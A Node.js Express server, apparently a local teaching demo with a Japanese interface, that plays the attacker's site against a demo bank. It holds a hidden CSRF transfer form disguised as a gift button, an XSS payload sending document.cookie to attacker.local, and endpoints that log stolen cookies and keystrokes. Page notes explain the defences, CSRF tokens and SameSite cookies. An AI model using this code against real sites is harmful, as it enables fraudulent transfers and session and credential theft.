// attacker.local:3001
const express = require('express')
const app = express()

app.get('/', (req, res) => res.send(attackerPage()))

function attackerPage() {
  return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>attacker.example.com</title>
<style>
  * { box-sizing: border-box; }
  body { font-family: sans-serif; background: #1a1a2e; color: #ddd; margin: 0; padding: 32px 0 80px; }
  .wrap { max-width: 820px; margin: 0 auto; padding: 0 24px; }
  h1 { color: #e74c3c; margin-bottom: 4px; }
  .sub { color: #666; font-size: 13px; margin-bottom: 32px; }
  .card { background: #16213e; border: 1px solid #e74c3c44; padding: 24px; border-radius: 10px; margin: 20px 0; }
  .card h3 { margin: 0 0 12px; color: #e74c3c; font-size: 16px; }
  p { font-size: 14px; line-height: 1.7; color: #aaa; margin: 8px 0; }
  code { background: #0f3460; padding: 2px 8px; border-radius: 4px; font-size: 13px; color: #7fb3f5; }
  .btn { display: inline-block; background: #e74c3c; color: white; border: none; padding: 11px 22px; border-radius: 6px; cursor: pointer; font-size: 15px; text-decoration: none; }
  .btn:hover { background: #c0392b; }
  .btn-safe { background: #27ae60; }
  .btn-safe:hover { background: #219150; }
  .result { font-size: 14px; margin-top: 10px; }
  .ok { color: #2ecc71; }
  .ng { color: #e74c3c; }
  .step { display: flex; gap: 8px; align-items: flex-start; margin: 8px 0; }
  .step-num { background: #e74c3c; color: white; border-radius: 50%; width: 22px; height: 22px; display: flex; align-items: center; justify-content: center; font-size: 12px; flex-shrink: 0; margin-top: 1px; }
  .note { background: #0f3460; border-radius: 6px; padding: 12px 16px; font-size: 13px; color: #7fb3f5; margin-top: 12px; }
  hr { border: none; border-top: 1px solid #ffffff11; margin: 28px 0; }
  .footer { position: fixed; bottom: 0; left: 0; right: 0; background: #0f0f1a; padding: 10px 24px; font-size: 13px; color: #666; }
  .footer a { color: #5dade2; }
</style>
</head>
<body>
<div class="wrap">
  <h1>💀 attacker.example.com</h1>
  <p class="sub">port 3001 — 攻撃者のサイト。被害者（alice）がここを訪れると攻撃が発動する</p>

  <!-- CSRF Attack -->
  <div class="card">
    <h3>Attack: CSRF</h3>
    <p>被害者は <strong>bank.example.com にログイン中</strong> です。このページを開くだけで送金リクエストが飛びます。</p>

    <div class="step"><div class="step-num">1</div><p><a href="http://bank.local:3000" target="_blank" style="color:#5dade2">bank.local:3000</a> でログインして残高（¥10,000）を確認する</p></div>
    <div class="step"><div class="step-num">2</div><p>bank 側の設定を切り替えて、下のボタンを押す</p></div>
    <div class="step"><div class="step-num">3</div><p>bank に戻って残高とログを確認する</p></div>

    <hr>

    <!-- 攻撃フォーム（隠れている） -->
    <form id="csrfForm" method="POST" action="http://bank.local:3000/transfer" style="display:none">
      <input name="to" value="attacker">
      <input name="amount" value="3000">
      <!-- CSRFトークンは知らないので入れられない -->
    </form>

    <p style="margin-bottom:12px">
      被害者には <strong>「プレゼントを受け取る」</strong> ボタンに見えている。実際は送金フォームを送信している。
    </p>
    <button class="btn" onclick="document.getElementById('csrfForm').submit()">
      🎁 無料プレゼントを受け取る
    </button>

    <div class="note">
      <strong>✅ CSRFトークン ON のとき：</strong> bank 側でトークン不一致としてブロックされる<br>
      <strong>❌ CSRFトークン OFF のとき：</strong> ¥3,000 の送金が成功する<br>
      <strong>✅ SameSite=strict のとき：</strong> Cookie が付かないので「未ログイン」扱いになり攻撃が成立しない
    </div>
  </div>

  <div class="card">
    <h3>おまけ：XSS との違い</h3>
    <p>CSRF は Cookie を「盗まない」。ブラウザが自動付与するだけ。</p>
    <p>XSS は Cookie や localStorage を「盗む」。デモは <a href="http://bank.local:3000/comments" target="_blank" style="color:#5dade2">コメント掲示板</a> で確認できる。</p>
    <div class="note">
      XSS ペイロード例：<br>
      <code>&lt;img src=x onerror="fetch('http://attacker.local:3001/stolen?c='+document.cookie)"&gt;</code>
    </div>
  </div>
</div>

<div class="footer">
  bank サイト → <a href="http://bank.local:3000" target="_blank">bank.local:3000</a>
</div>

</body></html>`
}

// XSS で盗まれたデータを受け取るエンドポイント（デモ用）
app.get('/stolen', (req, res) => {
  if (req.query.c !== undefined) {
    const cookie = req.query.c || '（空 — HttpOnly が有効なため読めない）'
    console.log(`\n💀 盗まれたCookie: ${cookie}\n`)
  }
  if (req.query.key !== undefined) {
    // キーロガー：1文字ずつ出力
    process.stdout.write(req.query.key === 'Enter' ? '\n' : req.query.key)
  }
  res.set('Access-Control-Allow-Origin', '*')
  res.send('ok')
})

app.listen(3001, () => {
  console.log('attacker: http://attacker.local:3001')
})
